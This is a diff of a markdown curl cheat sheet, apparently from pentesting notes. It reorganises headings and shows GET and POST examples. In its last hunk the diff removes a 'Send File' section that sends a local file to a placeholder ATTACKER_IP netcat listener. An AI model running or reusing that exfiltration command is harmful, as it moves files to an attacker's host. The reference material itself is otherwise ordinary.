@@ -6,14 +6,20 @@ description: A command line tool and library for transferring data with URL synt
 
 **[https://github.com/curl/curl](https://github.com/curl/curl)**
 
-## Basis
+# Basis
+
+---
+
+### Basis
 
 
  > 
  > **<font color=red>curl</font> http://my.url**</br>
  > Get HTTP Content.
 
-## Flags
+---
+
+### Flags
 
 
  > 
@@ -44,7 +50,11 @@ description: A command line tool and library for transferring data with URL synt
  > **<font color=red>-H '</font>myHeader: myValue<font color=red>'</font>**</br>
  > Set Header.
 
-## GET Request with JWT
+# Exemples
+
+---
+
+### GET Request with JWT
 
 
  > 
@@ -52,7 +62,9 @@ description: A command line tool and library for transferring data with URL synt
  > **<font color=red>-H 'Authorization: Bearer</font> \[JWT_TOKEN\]<font color=red>'</font>**</br>
  > Example GET request with JWT.
 
-## Example POST Request with JSON Content
+---
+
+### POST Request with JSON Content
 
 
  > 
@@ -61,10 +73,3 @@ description: A command line tool and library for transferring data with URL synt
  > **<font color=red>-H "Content-Type: application/json" \\</font>**</br>
  > **<font color=red>-d '{"</font>username<font color=red>":"</font>User<font color=red>","</font>password<font color=red>":"</font>P@ssw0rd<font color=red>"}'</font>**</br>
  > Example POST request with JSON content.
-
-## Send File
-
-
- > 
- > **<font color=red>curl</font> \[ATTACKER_IP\]<font color=red>:</font>\[ATTACKER_PORT\]<font color=red> -F 'data=@</font>fmyFile<font color=red>'</font>**</br>
- > Send myFile to an netcat listener.
